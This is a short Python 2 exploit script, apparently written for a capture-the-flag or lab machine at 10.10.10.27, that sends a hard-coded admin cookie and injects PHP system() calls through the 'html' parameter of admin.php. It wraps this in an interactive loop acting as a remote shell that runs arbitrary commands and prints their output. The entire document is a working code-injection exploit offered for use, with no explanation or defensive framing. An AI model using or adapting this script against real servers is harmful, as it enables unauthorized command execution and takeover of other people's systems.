#! /usr/bin python

import requests
cookies = dict(adminpowa='noonecares')

def shell(cmd):
	r = requests.get('http://10.10.10.27/admin.php?html=<?php system("'+cmd+'"); ?>', cookies=cookies)
	html = r.text
	print html[html.find("</html>")+7:]


if __name__ == '__main__':
	print "[+] connected to 10.10.10.27 ..."
	while True:
		cmd = raw_input("\033[92mbash $ ")
		shell(cmd)
